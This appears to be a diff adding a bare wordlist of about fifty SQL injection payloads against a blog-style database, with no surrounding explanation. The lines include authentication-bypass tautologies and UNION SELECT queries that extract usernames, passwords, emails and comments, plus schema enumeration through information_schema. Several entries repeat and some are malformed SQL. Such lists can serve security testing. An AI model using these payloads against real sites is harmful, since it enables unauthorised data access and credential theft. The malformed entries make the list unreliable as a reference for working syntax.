@@ -1,0 +1,50 @@
+' OR 1=1 --
+' OR 'a'='a' --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts --
+' UNION SELECT NULL, author_name, author_email FROM authors --
+' UNION SELECT NULL, comment_author, comment_text FROM comments --
+' AND 1=1 --
+' AND 'a'='a' --
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id=1 --
+' UNION SELECT NULL, comment_author, comment_text FROM comments WHERE post_id=1 --
+' OR 1=1 AND SELECT * FROM users --
+' AND 1=1 ORDER BY 1 --
+' UNION SELECT NULL, post_title, post_date FROM blog_posts --
+' UNION SELECT NULL, username, email FROM users WHERE user_role='admin' --
+' OR 1=1 AND SELECT user() --
+' OR 1=1 AND SELECT database() --
+' UNION SELECT NULL, comment_author, comment_email FROM comments --
+' AND 1=1 LIMIT 1,1 --
+' UNION SELECT NULL, post_title, post_author FROM blog_posts --
+' OR 'a'='a' AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT NULL, author_name, author_email FROM authors WHERE author_id=2 --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id=10 --
+' UNION SELECT NULL, username, password FROM users WHERE username='admin' --
+' UNION SELECT NULL, post_title, post_content, post_date FROM blog_posts WHERE category_id=1 --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id='test' --
+' UNION SELECT NULL, comment_author, comment_email FROM comments WHERE post_id=5 --
+' OR 1=1 AND SELECT * FROM blog_posts WHERE post_title='test' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id=1 --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_title LIKE '%admin%' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id=100 --
+' OR 1=1 AND SELECT * FROM users WHERE user_role='editor' --
+' UNION SELECT NULL, post_title, post_author FROM blog_posts WHERE post_id=2 --
+' UNION SELECT NULL, post_title, post_content, post_author FROM blog_posts --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_date='2023-12-01' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE category='Technology' --
+' UNION SELECT NULL, username, password FROM users WHERE username='admin' --
+' OR 1=1 AND SELECT COUNT(*) FROM blog_posts --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE category='Lifestyle' --
+' OR 1=1 AND SELECT * FROM users WHERE user_role='admin' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id='test' --
+' UNION SELECT NULL, comment_author, comment_email FROM comments WHERE post_id=3 --
+' OR 'a'='a' AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE category='Health' --
+' UNION SELECT NULL, comment_author, comment_email FROM comments WHERE post_id=2 --
+' OR 1=1 AND SELECT * FROM blog_posts WHERE post_title='test' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_title LIKE '%admin%' --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE post_id=5 --
+' UNION SELECT NULL, post_title, post_author FROM blog_posts WHERE post_id=50 --
+' UNION SELECT NULL, post_title, post_content FROM blog_posts WHERE category='News' --
